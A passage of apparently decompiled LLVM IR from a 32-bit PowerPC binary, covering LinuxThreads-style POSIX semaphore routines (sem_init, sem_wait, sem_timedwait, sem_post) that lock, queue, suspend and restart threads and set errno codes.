  store i32 %v1_100170e8, i32* %v2_100170dc, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10017108

dec_label_pc_10017108:                            ; preds = %dec_label_pc_100170f0, %dec_label_pc_10017100
  %v0_10017108 = load i32, i32* @r31, align 4
  store i32 %v0_10017108, i32* @r3, align 4
  store i32 268529936, i32* @lr, align 4
  %v0_1001710c = call i32 @__pthread_unlock()
  %v0_10017110 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_10017110

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017108, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp5 = icmp sgt i32 %arg3, -1
  br i1 %tmp5, label %dec_label_pc_10017150, label %dec_label_pc_10017140

dec_label_pc_10017140:                            ; preds = %entry
  %v0_10017140 = call i32 @__errno_location()
  br label %dec_label_pc_10017160

dec_label_pc_10017150:                            ; preds = %entry
  %v3_10017134 = icmp eq i32 %arg2, 0
  br i1 %v3_10017134, label %dec_label_pc_10017168, label %dec_label_pc_10017154

dec_label_pc_10017154:                            ; preds = %dec_label_pc_10017150
  %v0_10017154 = call i32 @__errno_location()
  br label %dec_label_pc_10017160

dec_label_pc_10017160:                            ; preds = %dec_label_pc_10017140, %dec_label_pc_10017154
  %storemerge1 = phi i32 [ %v0_10017140, %dec_label_pc_10017140 ], [ %v0_10017154, %dec_label_pc_10017154 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_10017140 ], [ 38, %dec_label_pc_10017154 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10017160 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_10017160, align 4
  br label %dec_label_pc_1001717c

dec_label_pc_10017168:                            ; preds = %dec_label_pc_10017150
  %v2_10017168 = add i32 %tmp, 12
  %v3_10017168 = inttoptr i32 %v2_10017168 to i32*
  store i32 0, i32* %v3_10017168, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10017170 = add i32 %tmp, 8
  %v3_10017170 = inttoptr i32 %v2_10017170 to i32*
  store i32 %arg3, i32* %v3_10017170, align 4
  store i32 0, i32* %arg1, align 4
  %v2_10017178 = add i32 %tmp, 4
  %v3_10017178 = inttoptr i32 %v2_10017178 to i32*
  store i32 0, i32* %v3_10017178, align 4
  br label %dec_label_pc_1001717c

dec_label_pc_1001717c:                            ; preds = %dec_label_pc_10017160, %dec_label_pc_10017168
  %v0_10017180 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10017180

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1001717c, { 1, 0 }
  uselistorder label %dec_label_pc_10017160, { 1, 0 }
}

define i32 @suspend.8(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268530080, i32* @lr, align 4
  %v0_1001719c = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_1001719c
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100171c0 = load i32, i32* @r2, align 4
  store i32 %v0_100171c0, i32* @r4, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  store i32 268530144, i32* @lr, align 4
  %v0_100171dc = call i32 @__pthread_lock()
  %v0_100171e0 = load i32, i32* @r31, align 4
  %v1_100171e0 = add i32 %v0_100171e0, 8
  %v2_100171e0 = inttoptr i32 %v1_100171e0 to i32*
  %v3_100171e0 = load i32, i32* %v2_100171e0, align 4
  %tmp12 = icmp slt i32 %v3_100171e0, 1
  br i1 %tmp12, label %dec_label_pc_10017200, label %dec_label_pc_100171ec

dec_label_pc_100171ec:                            ; preds = %entry
  %v1_100171ec = add i32 %v3_100171e0, -1
  store i32 %v0_100171e0, i32* @r3, align 4
  store i32 %v1_100171ec, i32* %v2_100171e0, align 4
  store i32 ptrtoint (i32* @global_var_100171fc.1092 to i32), i32* @lr, align 4
  %v0_100171f8 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100172ec

dec_label_pc_10017200:                            ; preds = %entry
  %v2_10017208 = ptrtoint i32* %stack_var_-20 to i32
  %v3_1001720c = add i32 %v0_100171c0, 442
  %v4_1001720c = inttoptr i32 %v3_1001720c to i8*
  store i8 0, i8* %v4_1001720c, align 1
  store i32 268530200, i32* @lr, align 4
  %v2_10017214 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100171c0, i32 %v2_10017208)
  %v1_1001721c = add i32 %v0_100171c0, 66
  %v2_1001721c = inttoptr i32 %v1_1001721c to i8*
  %v3_1001721c = load i8, i8* %v2_1001721c, align 1
  %v3_10017220 = icmp eq i8 %v3_1001721c, 0
  br i1 %v3_10017220, label %dec_label_pc_1001723c, label %dec_label_pc_10017228

dec_label_pc_10017228:                            ; preds = %dec_label_pc_10017200
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_10017230 = add i32 %v0_100171c0, 64
  %v2_10017230 = inttoptr i32 %v1_10017230 to i8*
  %v3_10017230 = load i8, i8* %v2_10017230, align 1
  %v3_10017234 = icmp eq i8 %v3_10017230, 0
  br i1 %v3_10017234, label %dec_label_pc_1001724c, label %dec_label_pc_1001723c

dec_label_pc_1001723c:                            ; preds = %dec_label_pc_10017228, %dec_label_pc_10017200
  %v0_10017240 = load i32, i32* @r31, align 4
  %v1_10017240 = add i32 %v0_10017240, 12
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10017248 = call i32 @enqueue.5(i32 %v1_10017240, i32 %v0_100171c0)
  br label %dec_label_pc_1001724c

dec_label_pc_1001724c:                            ; preds = %dec_label_pc_10017228, %dec_label_pc_1001723c
  %v0_1001724c = load i32, i32* @r31, align 4
  store i32 %v0_1001724c, i32* @r3, align 4
  store i32 268530260, i32* @lr, align 4
  %v0_10017250 = call i32 @__pthread_unlock()
  %v0_10017254 = load i32, i32* %r30.global-to-local, align 4
  %v3_10017254 = icmp eq i32 %v0_10017254, 0
  store i32 %v0_100171c0, i32* @r3, align 4
  br i1 %v3_10017254, label %dec_label_pc_10017274.preheader, label %dec_label_pc_1001725c

dec_label_pc_10017274.preheader:                  ; preds = %dec_label_pc_1001724c
  store i32 268530300, i32* @lr, align 4
  %v1_100172781 = call i32 @suspend.8(i32 %v0_100171c0)
  %v3_100172802 = load i8, i8* %v4_1001720c, align 1
  %v3_100172845 = icmp eq i8 %v3_100172802, 0
  %v1_10017290 = add i32 %v0_100171c0, 440
  %v2_10017290 = inttoptr i32 %v1_10017290 to i8*
  br i1 %v3_100172845, label %dec_label_pc_1001728c.lr.ph, label %dec_label_pc_100172ac

dec_label_pc_1001728c.lr.ph:                      ; preds = %dec_label_pc_10017274.preheader
  %v1_100172a0 = add i32 %v0_100171c0, 64
  %v2_100172a0 = inttoptr i32 %v1_100172a0 to i8*
  br label %dec_label_pc_1001728c

dec_label_pc_1001725c:                            ; preds = %dec_label_pc_1001724c
  store i32 268530280, i32* @lr, align 4
  %v2_10017264 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100171c0, i32 0)
  br label %dec_label_pc_100172e8

dec_label_pc_1001728c:                            ; preds = %dec_label_pc_1001728c.lr.ph, %dec_label_pc_10017274.backedge
  %v3_10017290 = load i8, i8* %v2_10017290, align 1
  %v3_10017294 = icmp eq i8 %v3_10017290, 0
  br i1 %v3_10017294, label %dec_label_pc_10017274.backedge, label %dec_label_pc_1001729c

dec_label_pc_10017274.backedge:                   ; preds = %dec_label_pc_1001728c, %dec_label_pc_1001729c
  store i32 %v0_100171c0, i32* @r3, align 4
  store i32 268530300, i32* @lr, align 4
  %v1_10017278 = call i32 @suspend.8(i32 %v0_100171c0)
  %v3_10017280 = load i8, i8* %v4_1001720c, align 1
  %v3_10017284 = icmp eq i8 %v3_10017280, 0
  br i1 %v3_10017284, label %dec_label_pc_1001728c, label %dec_label_pc_100172ac

dec_label_pc_1001729c:                            ; preds = %dec_label_pc_1001728c
  %v3_100172a0 = load i8, i8* %v2_100172a0, align 1
  %v3_100172a4 = icmp eq i8 %v3_100172a0, 0
  br i1 %v3_100172a4, label %dec_label_pc_100172ac, label %dec_label_pc_10017274.backedge

dec_label_pc_100172ac:                            ; preds = %dec_label_pc_10017274.backedge, %dec_label_pc_1001729c, %dec_label_pc_10017274.preheader
  store i32 268530360, i32* @lr, align 4
  %v2_100172b4 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100171c0, i32 0)
  %v3_100172bc = load i8, i8* %v2_10017290, align 1
  %v3_100172c0 = icmp eq i8 %v3_100172bc, 0
  br i1 %v3_100172c0, label %dec_label_pc_100172ec, label %dec_label_pc_100172c8

dec_label_pc_100172c8:                            ; preds = %dec_label_pc_100172ac
  %v1_100172cc = add i32 %v0_100171c0, 64
  %v2_100172cc = inttoptr i32 %v1_100172cc to i8*
  %v3_100172cc = load i8, i8* %v2_100172cc, align 1
  %v3_100172d0 = icmp eq i8 %v3_100172cc, 0
  br i1 %v3_100172d0, label %dec_label_pc_100172d8, label %dec_label_pc_100172ec

dec_label_pc_100172d8:                            ; preds = %dec_label_pc_100172c8
  store i8 0, i8* %v2_10017290, align 1
  br label %dec_label_pc_100172e8

dec_label_pc_100172e8:                            ; preds = %dec_label_pc_1001725c, %dec_label_pc_100172d8
  %v0_100172e8 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100172ec

dec_label_pc_100172ec:                            ; preds = %dec_label_pc_100172c8, %dec_label_pc_100172ac, %dec_label_pc_100171ec, %dec_label_pc_100172e8
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_1001720c, { 1, 0, 2 }
  uselistorder i32 %v0_100171c0, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13, 14 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 268530300, { 1, 0 }
  uselistorder label %dec_label_pc_100172ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100172e8, { 1, 0 }
  uselistorder label %dec_label_pc_100172ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017274.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1001728c, { 1, 0 }
  uselistorder label %dec_label_pc_1001724c, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1001730c = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 %v0_1001730c, i32* @r4, align 4
  store i32 268530472, i32* @lr, align 4
  %v0_10017324 = call i32 @__pthread_lock()
  %v0_10017328 = load i32, i32* @r29, align 4
  %v1_1001732c = add i32 %arg1, 12
  store i32 %v1_1001732c, i32* @r3, align 4
  %v2_10017330 = call i32 @remove_from_queue.6(i32 %v1_1001732c, i32 %v0_10017328)
  %v0_10017338 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10017338, i32* @r3, align 4
  store i32 268530496, i32* @lr, align 4
  %v0_1001733c = call i32 @__pthread_unlock()
  ret i32 %v2_10017330
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v0_1001736c = load i32, i32* @r2, align 4
  store i32 %v0_1001736c, i32* @r4, align 4
  store i32 268530556, i32* @lr, align 4
  %v0_10017378 = call i32 @__pthread_lock()
  %v0_1001737c = load i32, i32* @r30, align 4
  %v1_1001737c = add i32 %v0_1001737c, 8
  %v2_1001737c = inttoptr i32 %v1_1001737c to i32*
  %v3_1001737c = load i32, i32* %v2_1001737c, align 4
  store i32 %v3_1001737c, i32* %r9.global-to-local, align 4
  %tmp10 = icmp slt i32 %v3_1001737c, 1
  br i1 %tmp10, label %dec_label_pc_1001739c, label %dec_label_pc_10017388

dec_label_pc_10017388:                            ; preds = %entry
  %v1_10017388 = add i32 %v3_1001737c, -1
  store i32 %v0_1001737c, i32* @r3, align 4
  store i32 %v1_10017388, i32* %v2_1001737c, align 4
  store i32 ptrtoint (i32* @global_var_10017398.1093 to i32), i32* @lr, align 4
  %v0_10017394 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10017500

dec_label_pc_1001739c:                            ; preds = %entry
  %v0_1001739c = load i32, i32* @r28, align 4
  %v1_1001739c = add i32 %v0_1001739c, 4
  %v2_1001739c = inttoptr i32 %v1_1001739c to i32*
  %v3_1001739c = load i32, i32* %v2_1001739c, align 4
  store i32 999999999, i32* %r9.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_1001739c, 1000000000
  br i1 %tmp11, label %dec_label_pc_100173c8, label %dec_label_pc_100173b0

dec_label_pc_100173b0:                            ; preds = %dec_label_pc_1001739c
  store i32 %v0_1001737c, i32* @r3, align 4
  store i32 268530616, i32* @lr, align 4
  %v0_100173b4 = call i32 @__pthread_unlock()
  %v0_100173b8 = call i32 @__errno_location()
  br label %dec_label_pc_100174f8

dec_label_pc_100173c8:                            ; preds = %dec_label_pc_1001739c
  store i32 268530436, i32* %r9.global-to-local, align 4
  store i32 %v0_1001737c, i32* %stack_var_-40, align 4
  %v0_100173dc = load i32, i32* @r31, align 4
  %v3_100173e0 = add i32 %v0_100173dc, 442
  %v4_100173e0 = inttoptr i32 %v3_100173e0 to i8*
  store i8 0, i8* %v4_100173e0, align 1
  %v2_100173e4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268530668, i32* @lr, align 4
  %v2_100173e8 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100173dc, i32 %v2_100173e4)
  %v0_100173ec = load i32, i32* @r31, align 4
  %v1_100173ec = add i32 %v0_100173ec, 66
  %v2_100173ec = inttoptr i32 %v1_100173ec to i8*
  %v3_100173ec = load i8, i8* %v2_100173ec, align 1
  %v3_100173f0 = icmp eq i8 %v3_100173ec, 0
  br i1 %v3_100173f0, label %dec_label_pc_10017408, label %dec_label_pc_100173f8

dec_label_pc_100173f8:                            ; preds = %dec_label_pc_100173c8
  %v1_100173f8 = add i32 %v0_100173ec, 64
  %v2_100173f8 = inttoptr i32 %v1_100173f8 to i8*
  %v3_100173f8 = load i8, i8* %v2_100173f8, align 1
  store i32 1, i32* @r29, align 4
  %v3_10017400 = icmp eq i8 %v3_100173f8, 0
  br i1 %v3_10017400, label %dec_label_pc_10017418, label %dec_label_pc_10017408

dec_label_pc_10017408:                            ; preds = %dec_label_pc_100173f8, %dec_label_pc_100173c8
  %v0_10017408 = load i32, i32* @r30, align 4
  %v1_10017408 = add i32 %v0_10017408, 12
  %v2_10017410 = call i32 @enqueue.5(i32 %v1_10017408, i32 %v0_100173ec)
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10017418

dec_label_pc_10017418:                            ; preds = %dec_label_pc_100173f8, %dec_label_pc_10017408
  %v0_10017418 = load i32, i32* @r30, align 4
  store i32 %v0_10017418, i32* @r3, align 4
  store i32 268530720, i32* @lr, align 4
  %v0_1001741c = call i32 @__pthread_unlock()
  %v0_10017420 = load i32, i32* @r29, align 4
  %v3_10017420 = icmp eq i32 %v0_10017420, 0
  %v0_10017440.pre = load i32, i32* @r31, align 4
  br i1 %v3_10017420, label %dec_label_pc_10017440, label %dec_label_pc_10017428

dec_label_pc_10017428:                            ; preds = %dec_label_pc_10017418
  store i32 268530740, i32* @lr, align 4
  %v2_10017430 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10017440.pre, i32 0)
  br label %dec_label_pc_100174dc

dec_label_pc_10017440:                            ; preds = %dec_label_pc_100174a0, %dec_label_pc_10017494, %dec_label_pc_10017418
  %v0_10017440 = phi i32 [ %v0_10017440.pre, %dec_label_pc_10017418 ], [ %v0_10017488, %dec_label_pc_10017494 ], [ %v0_10017488, %dec_label_pc_100174a0 ]
  %v0_10017444 = load i32, i32* @r28, align 4
  store i32 268530764, i32* @lr, align 4
  %v2_10017448 = inttoptr i32 %v0_10017444 to i32*
  %v3_10017448 = call i32 @__pthread_timedsuspend_new(i32 %v0_10017440, i32* %v2_10017448)
  %v3_1001744c = icmp eq i32 %v3_10017448, 0
  br i1 %v3_1001744c, label %dec_label_pc_10017454, label %dec_label_pc_10017488

dec_label_pc_10017454:                            ; preds = %dec_label_pc_10017440
  %v0_10017454 = load i32, i32* @r30, align 4
  store i32 %v0_10017454, i32* @r3, align 4
  %v0_10017458 = load i32, i32* @r31, align 4
  store i32 %v0_10017458, i32* @r4, align 4
  store i32 268530784, i32* @lr, align 4
  %v0_1001745c = call i32 @__pthread_lock()
  %v0_10017460 = load i32, i32* @r31, align 4
  %v0_10017464 = load i32, i32* @r30, align 4
  %v1_10017464 = add i32 %v0_10017464, 12
  store i32 %v1_10017464, i32* @r3, align 4
  %v2_10017468 = call i32 @remove_from_queue.6(i32 %v1_10017464, i32 %v0_10017460)
  %v0_10017470 = load i32, i32* @r30, align 4
  store i32 %v0_10017470, i32* @r3, align 4
  store i32 268530808, i32* @lr, align 4
  %v0_10017474 = call i32 @__pthread_unlock()
  %v3_10017478 = icmp eq i32 %v2_10017468, 0
  br i1 %v3_10017478, label %dec_label_pc_10017480, label %dec_label_pc_100174e0

dec_label_pc_10017480:                            ; preds = %dec_label_pc_10017454
  %v0_10017480 = load i32, i32* @r31, align 4
  store i32 %v0_10017480, i32* @r3, align 4
  store i32 268530824, i32* @lr, align 4
  %v1_10017484 = call i32 @suspend.8(i32 %v0_10017480)
  br label %dec_label_pc_10017488

dec_label_pc_10017488:                            ; preds = %dec_label_pc_10017440, %dec_label_pc_10017480
  %v0_10017488 = load i32, i32* @r31, align 4
  %v1_10017488 = add i32 %v0_10017488, 442
  %v2_10017488 = inttoptr i32 %v1_10017488 to i8*
  %v3_10017488 = load i8, i8* %v2_10017488, align 1
  %v3_1001748c = icmp eq i8 %v3_10017488, 0
  br i1 %v3_1001748c, label %dec_label_pc_10017494, label %dec_label_pc_100174ac

dec_label_pc_10017494:                            ; preds = %dec_label_pc_10017488
  %v1_10017494 = add i32 %v0_10017488, 440
  %v2_10017494 = inttoptr i32 %v1_10017494 to i8*
  %v3_10017494 = load i8, i8* %v2_10017494, align 1
  %v3_10017498 = icmp eq i8 %v3_10017494, 0
  br i1 %v3_10017498, label %dec_label_pc_10017440, label %dec_label_pc_100174a0

dec_label_pc_100174a0:                            ; preds = %dec_label_pc_10017494
  %v1_100174a0 = add i32 %v0_10017488, 64
  %v2_100174a0 = inttoptr i32 %v1_100174a0 to i8*
  %v3_100174a0 = load i8, i8* %v2_100174a0, align 1
  %v3_100174a4 = icmp eq i8 %v3_100174a0, 0
  br i1 %v3_100174a4, label %dec_label_pc_100174ac, label %dec_label_pc_10017440

dec_label_pc_100174ac:                            ; preds = %dec_label_pc_100174a0, %dec_label_pc_10017488
  store i32 268530872, i32* @lr, align 4
  %v2_100174b4 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10017488, i32 0)
  %v0_100174b8 = load i32, i32* @r31, align 4
  %v1_100174b8 = add i32 %v0_100174b8, 440
  %v2_100174b8 = inttoptr i32 %v1_100174b8 to i8*
  %v3_100174b8 = load i8, i8* %v2_100174b8, align 1
  %v3_100174bc = icmp eq i8 %v3_100174b8, 0
  br i1 %v3_100174bc, label %dec_label_pc_10017500, label %dec_label_pc_100174c4

dec_label_pc_100174c4:                            ; preds = %dec_label_pc_100174ac
  %v1_100174c4 = add i32 %v0_100174b8, 64
  %v2_100174c4 = inttoptr i32 %v1_100174c4 to i8*
  %v3_100174c4 = load i8, i8* %v2_100174c4, align 1
  %v3_100174c8 = icmp eq i8 %v3_100174c4, 0
  br i1 %v3_100174c8, label %dec_label_pc_100174d0, label %dec_label_pc_10017500

dec_label_pc_100174d0:                            ; preds = %dec_label_pc_100174c4
  store i8 0, i8* %v2_100174b8, align 1
  br label %dec_label_pc_100174dc

dec_label_pc_100174dc:                            ; preds = %dec_label_pc_10017428, %dec_label_pc_100174d0
  %v0_100174dc = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100174e0

dec_label_pc_100174e0:                            ; preds = %dec_label_pc_10017454, %dec_label_pc_100174dc
  %v0_100174e0 = load i32, i32* @r31, align 4
  store i32 268530924, i32* @lr, align 4
  %v2_100174e8 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100174e0, i32 0)
  %v0_100174ec = call i32 @__errno_location()
  br label %dec_label_pc_100174f8

dec_label_pc_100174f8:                            ; preds = %dec_label_pc_100173b0, %dec_label_pc_100174e0
  %storemerge2 = phi i32 [ %v0_100173b8, %dec_label_pc_100173b0 ], [ %v0_100174ec, %dec_label_pc_100174e0 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_100173b0 ], [ 110, %dec_label_pc_100174e0 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100174f8 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_100174f8, align 4
  %v0_10017508.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017504

dec_label_pc_10017500:                            ; preds = %dec_label_pc_100174c4, %dec_label_pc_100174ac, %dec_label_pc_10017388
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017504

dec_label_pc_10017504:                            ; preds = %dec_label_pc_100174f8, %dec_label_pc_10017500
  %v0_10017508 = phi i32 [ %v0_10017508.pre, %dec_label_pc_100174f8 ], [ 0, %dec_label_pc_10017500 ]
  ret i32 %v0_10017508

; uselistorder directives
  uselistorder i32 %v0_10017488, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 110, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_do_exit, { 9, 8, 11, 7, 1, 3, 6, 5, 0, 4, 2, 10 }
  uselistorder i32 440, { 0, 1, 2, 6, 5, 3, 4 }
  uselistorder i32 (i32)* @suspend.8, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @enqueue.5, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.7, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 999999999, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10017504, { 1, 0 }
  uselistorder label %dec_label_pc_100174f8, { 1, 0 }
  uselistorder label %dec_label_pc_100174e0, { 1, 0 }
  uselistorder label %dec_label_pc_100174dc, { 1, 0 }
  uselistorder label %dec_label_pc_10017488, { 1, 0 }
  uselistorder label %dec_label_pc_10017418, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10017524 = load i32, i32* @r2, align 4
  store i32 %v0_10017524, i32* @r4, align 4
  %v1_10017534 = add i32 %v0_10017524, 84
  %v2_10017534 = inttoptr i32 %v1_10017534 to i32*
  %v3_10017534 = load i32, i32* %v2_10017534, align 4
  store i32 %v3_10017534, i32* @r29, align 4
  %v3_10017538 = icmp eq i32 %v3_10017534, 0
  br i1 %v3_10017538, label %dec_label_pc_10017540, label %dec_label_pc_100175bc

dec_label_pc_10017540:                            ; preds = %entry
  store i32 268531012, i32* @lr, align 4
  %v0_10017540 = call i32 @__pthread_lock()
  %v0_10017544 = load i32, i32* @r30, align 4
  %v1_10017544 = add i32 %v0_10017544, 12
  %v2_10017544 = inttoptr i32 %v1_10017544 to i32*
  %v3_10017544 = load i32, i32* %v2_10017544, align 4
  store i32 %v3_10017544, i32* @r31, align 4
  %v3_10017548 = icmp eq i32 %v3_10017544, 0
  br i1 %v3_10017548, label %dec_label_pc_10017550, label %dec_label_pc_10017590

dec_label_pc_10017550:                            ; preds = %dec_label_pc_10017540
  %v1_10017550 = add i32 %v0_10017544, 8
  %v2_10017550 = inttoptr i32 %v1_10017550 to i32*
  %v3_10017550 = load i32, i32* %v2_10017550, align 4
  store i32 %v3_10017550, i32* %r9.global-to-local, align 4
  %v3_10017558 = icmp eq i32 %v3_10017550, 2147483647
  br i1 %v3_10017558, label %dec_label_pc_10017560, label %dec_label_pc_1001757c

dec_label_pc_10017560:                            ; preds = %dec_label_pc_10017550
  %v0_10017560 = call i32 @__errno_location()
  %v2_10017568 = inttoptr i32 %v0_10017560 to i32*
  store i32 34, i32* %v2_10017568, align 4
  %v0_1001756c = load i32, i32* @r30, align 4
  store i32 %v0_1001756c, i32* @r3, align 4
  store i32 268531060, i32* @lr, align 4
  %v0_10017570 = call i32 @__pthread_unlock()
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017628

dec_label_pc_1001757c:                            ; preds = %dec_label_pc_10017550
  %v1_1001757c = add i32 %v3_10017550, 1
  store i32 %v0_10017544, i32* @r3, align 4
  store i32 %v1_1001757c, i32* %v2_10017550, align 4
  store i32 ptrtoint (i32* @global_var_1001758c.1095 to i32), i32* @lr, align 4
  %v0_10017588 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10017624

dec_label_pc_10017590:                            ; preds = %dec_label_pc_10017540
  %v1_10017590 = add i32 %v3_10017544, 8
  %v2_10017590 = inttoptr i32 %v1_10017590 to i32*
  %v3_10017590 = load i32, i32* %v2_10017590, align 4
  store i32 %v0_10017544, i32* @r3, align 4
  store i32 %v3_10017590, i32* %v2_10017544, align 4
  %v0_1001759c = load i32, i32* @r29, align 4
  %v1_1001759c = load i32, i32* @r31, align 4
  %v2_1001759c = add i32 %v1_1001759c, 8
  %v3_1001759c = inttoptr i32 %v2_1001759c to i32*
  store i32 %v0_1001759c, i32* %v3_1001759c, align 4
  store i32 ptrtoint (i32* @global_var_100175a4.1096 to i32), i32* @lr, align 4
  %v0_100175a0 = call i32 @__pthread_unlock()
  %v2_100175a8 = load i32, i32* @r31, align 4
  %v3_100175a8 = add i32 %v2_100175a8, 442
  %v4_100175a8 = inttoptr i32 %v3_100175a8 to i8*
  store i8 1, i8* %v4_100175a8, align 1
  %v0_100175b0 = load i32, i32* @r31, align 4
  store i32 %v0_100175b0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100175b8.1097 to i32), i32* @lr, align 4
  %v0_100175b4 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_10017624

dec_label_pc_100175bc:                            ; preds = %entry
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100175c0 = load i32, i32* @global_var_100450c4.984, align 4
  %tmp7 = icmp sgt i32 %v3_100175c0, -1
  br i1 %tmp7, label %dec_label_pc_100175ec, label %dec_label_pc_100175cc

dec_label_pc_100175cc:                            ; preds = %dec_label_pc_100175bc
  store i32 268531152, i32* @lr, align 4
  %v2_100175cc = call i32 @__pthread_initialize_manager(i32 %v0_10017524)
  %tmp8 = icmp sgt i32 %v2_100175cc, -1
  br i1 %tmp8, label %dec_label_pc_100175ec, label %dec_label_pc_100175d8

dec_label_pc_100175d8:                            ; preds = %dec_label_pc_100175cc
  %v0_100175d8 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100175e4 = inttoptr i32 %v0_100175d8 to i32*
  store i32 11, i32* %v2_100175e4, align 4
  %v0_1001762c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017628

dec_label_pc_100175ec:                            ; preds = %dec_label_pc_100175cc, %dec_label_pc_100175bc
  %v2_100175fc = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_100175f8

dec_label_pc_100175f8:                            ; preds = %dec_label_pc_10017614, %dec_label_pc_100175ec
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10017600 = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268531212, i32* @lr, align 4
  %v2_10017608 = call i32 @__libc_write(i32 %v3_10017600, i32 %v2_100175fc)
  %v3_1001760c = icmp eq i32 %v2_10017608, -1
  br i1 %v3_1001760c, label %dec_label_pc_10017614, label %dec_label_pc_10017624

dec_label_pc_10017614:                            ; preds = %dec_label_pc_100175f8
  %v0_10017614 = call i32 @__errno_location()
  %v1_10017618 = inttoptr i32 %v0_10017614 to i32*
  %v2_10017618 = load i32, i32* %v1_10017618, align 4
  %v3_1001761c = icmp eq i32 %v2_10017618, 4
  br i1 %v3_1001761c, label %dec_label_pc_100175f8, label %dec_label_pc_10017624

dec_label_pc_10017624:                            ; preds = %dec_label_pc_100175f8, %dec_label_pc_10017614, %dec_label_pc_10017590, %dec_label_pc_1001757c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017628

dec_label_pc_10017628:                            ; preds = %dec_label_pc_100175d8, %dec_label_pc_10017560, %dec_label_pc_10017624
  %v0_1001762c = phi i32 [ %v0_1001762c.pre, %dec_label_pc_100175d8 ], [ -1, %dec_label_pc_10017560 ], [ 0, %dec_label_pc_10017624 ]
  ret i32 %v0_1001762c

; uselistorder directives
  uselistorder i32 %v3_10017550, { 1, 0, 2 }
  uselistorder i32 %v0_10017544, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %dec_label_pc_10017628, { 2, 0, 1 }
